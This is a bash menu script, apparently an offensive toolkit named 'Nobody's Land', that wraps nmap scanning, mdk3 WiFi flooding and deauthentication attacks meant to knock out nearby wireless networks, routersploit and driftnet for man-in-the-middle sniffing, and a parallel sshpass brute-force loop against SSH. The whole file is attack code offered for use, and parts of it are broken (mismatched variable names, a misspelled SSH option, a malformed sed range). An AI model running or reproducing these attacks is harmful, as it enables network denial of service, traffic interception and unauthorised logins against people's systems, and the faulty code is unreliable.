cyan='\e[0;36m' 
green='\033[92m' 
red='\e[1;31m' 
yel='\e[0;33m' 
orange='\e[38;5;166m'
echo -e $red"S1ST3M-CR4SH3RS-SQUAD"
figlet -f Poison "NOBODY'S"
figlet  -f Poison "LAND"

echo -e $red"By 0Day-At0miK"

#Attacks
echo -e $green"========================"
echo -e $yel"1)Scan Target 2)OS Fingerprint"
echo -e $green"========================"
echo -e $yel"3)WLAN Attacks Menú 4)Site Attacks Menú"
echo -e $green"========================"
echo -e $yel"5)N0B0DY'S L4ND ATTACK"
echo -e $green"========================"
echo -e $yel"6)MITM"
echo -e $green"========================"
echo -e $yel"7)SSH-BruteForce"
echo -e $green"========================"
echo -e $red"Happy Hacking! "

read -p " [<NL>] " attacks 

if [ $attacks = "1" ] 
then
clear 
figlet "Scan"
read -p " [>TARGET-IP<] " target1 
nmap $target1  
fi

if [ $attacks = "2" ]
then
clear 
figlet "OS"
figlet "Fingerprint"
read -p " [>TARGET-IP<] " target2 
nmap -A $target2
fi

if [ $attacks = "3" ]
then
clear
cd $HOME/NobodysLand/
bash WA.sh
fi

if [ $attacks = "4" ]
then
clear
cd $HOME/NobodysLand/
bash SA.sh 
fi

if [ $attacks = "5" ]
then 
clear
figlet "Nobody'S"
figlet "Land"
figlet "Attack" 
fi
if [ $attacks = "5" ]
then
echo -e $cyan"Are You Sure To Start This Powerful Attacks. This Attack May Take Offline All WiFi On Your Network [y/N]"
read -p " [>Choose<] " choose
if [ $choose = "y" ] 
then
read -p " [>Interface<] " inter
echo -e $red"[+] Starting..."

xterm -hold -e mdk3 $inter a

xterm -hold -e mdk3 $inter b

xterm -hold -e mdk3 $inter d

xterm -hold -e mdk3 $inter m

xterm -hold -e mdk3 $inter w 

fi
fi

if [ $attacks = "6" ]
then
figlet "MITM"
read -p " [>interface<] " target6
routersploit
xterm -hold -e driftnet $target6 
fi

if [ $attacks = "7" ] 
then
read -p " [>SSH-Target<] " SSH 
read -p " [>Wordlist<] " word 

count=0; while [ true ]; do start=$((1+$count)) end=$((5+$count)); for pass in $(sed -n ''$start','$end'p'$wordlist); do {(sshpass -p $pass ssh -o StrictHostKey=no $target1 -p 2022 "whoami" && echo Found! pass: $pass && kill -2 $$;)} & done ;wait $!; let count+=5;done 
fi

